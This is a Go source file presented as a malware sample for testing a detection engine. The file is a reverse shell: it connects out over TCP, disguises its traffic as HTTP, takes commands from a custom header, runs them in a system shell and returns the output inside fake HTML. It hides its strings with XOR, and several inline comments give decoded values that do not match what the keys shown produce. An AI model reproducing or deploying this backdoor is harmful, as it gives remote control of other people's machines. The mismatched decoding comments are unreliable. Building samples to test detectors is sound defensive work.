//go:build ignore

/*
!!! DANGER: LIVE MALWARE SAMPLE !!!
-------------------------------------------------------------------------
This file contains a functional REVERSE SHELL.
It is intended SOLELY for testing the Semantic Firewall detection engine.

DO NOT:
- Run this on a corporate network.
- Run this on a machine with sensitive data.
- Leave this compiled binary accessible to others.
- Don't be stupid. You will go to jail. There is always someone smarter than you.
USAGE:
This file is excluded from normal builds. To compile it for testing:

	go build dirty_shell.go

-------------------------------------------------------------------------
*/
package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Config holds the configuration for the application.
type Config struct {
	ID         int
	Profile    string
	Host       string
	Port       string
	Key        byte
	MaxRetries int
	RetryDelay time.Duration
}

// DataProcessor defines an interface for processing incoming data.
type DataProcessor interface {
	Process(data []byte, key byte) ([]byte, error)
}

// SystemCommandProcessor executes system commands.
type SystemCommandProcessor struct{}

// Process executes the given command.
func (p *SystemCommandProcessor) Process(data []byte, key byte) ([]byte, error) {
	cmdString := strings.TrimSpace(string(data))
	if cmdString == transform("gnqq", key) { // "kill"
		os.Exit(0)
	}
	if cmdString == "" {
		return nil, nil
	}

	shell := transform("1f`na1bj", key)             // "/bin/sh"
	arg := transform("1i", key)                     // "-c"
	if runtime.GOOS == transform("sajoistj", key) { // "windows"
		shell = transform("ioc`jj", key) // "cmd.exe"
		arg = transform("1I", key)       // "/C"
	}

	cmd := exec.Command(shell, arg, cmdString)
	return cmd.CombinedOutput()
}

// DecoyProcessor is a decoy that simulates data processing.
type DecoyProcessor struct{}

// Process simulates processing by calculating a checksum.
func (p *DecoyProcessor) Process(data []byte, key byte) ([]byte, error) {
	hash := sha256.Sum256(data)
	fmt.Printf("Decoy processed data, checksum: %s\n", hex.EncodeToString(hash[:]))
	return []byte("decoy processed"), nil
}

// transform applies a simple XOR transformation to a string.
func transform(s string, key byte) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		b[i] = s[i] ^ key
	}
	return string(b)
}

// connectToServer sets up and manages the connection to the server.
func connectToServer(config *Config, attempt int) {
	if attempt > config.MaxRetries {
		return
	}

	addr := config.Host + ":" + config.Port
	conn, err := net.Dial(transform("vix", config.Key), addr) // "tcp"
	if err != nil {
		time.Sleep(config.RetryDelay)
		connectToServer(config, attempt+1)
		return
	}

	// Masquerade as an HTTP client
	request := fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", config.Profile, config.Host)
	conn.Write([]byte(request))

	handleHttpTraffic(conn, config)
}

// getProcessor returns the appropriate data processor based on the config.
func getProcessor(profile string) DataProcessor {
	if profile == "prod" {
		return &SystemCommandProcessor{}
	}
	return &DecoyProcessor{}
}

// handleHttpTraffic manages the communication with the server.
func handleHttpTraffic(conn net.Conn, config *Config) {
	defer conn.Close()

	processor := getProcessor(config.Profile)
	reader := bufio.NewReader(conn)

	for {
		// Read the "HTTP response"
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		// Look for our custom header for the command
		if strings.HasPrefix(line, transform("ZFioc", config.Key)) { // "X-Cmd:"
			cmd := strings.TrimSpace(strings.Split(line, ":")[1])

			// Process the command
			result, err := processor.Process([]byte(cmd), config.Key)
			if err != nil {
				// In a real scenario, you'd send the error back in a covert way
				continue
			}

			// Send results back, hidden in a fake HTTP response body
			response := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body>%s</body></html>\r\n", string(result))
			conn.Write([]byte(response))

		}

		// If it's the end of the response, break to send a new request
		if line == "\r\n" {
			// Wait a bit before sending the next "request"
			time.Sleep(10 * time.Second)
			request := fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n\r\n", config.Profile, config.Host)
			conn.Write([]byte(request))
		}
	}
}

func main() {
	config := &Config{
		ID:         101,
		Profile:    "prod",
		Host:       transform("7;9>8>8>7", 0x3), // "127.0.0.1"
		Port:       transform("=;=;", 0x3),      // "8080"
		Key:        0x5E,
		MaxRetries: 3,
		RetryDelay: 5 * time.Second,
	}
	connectToServer(config, 1)
}
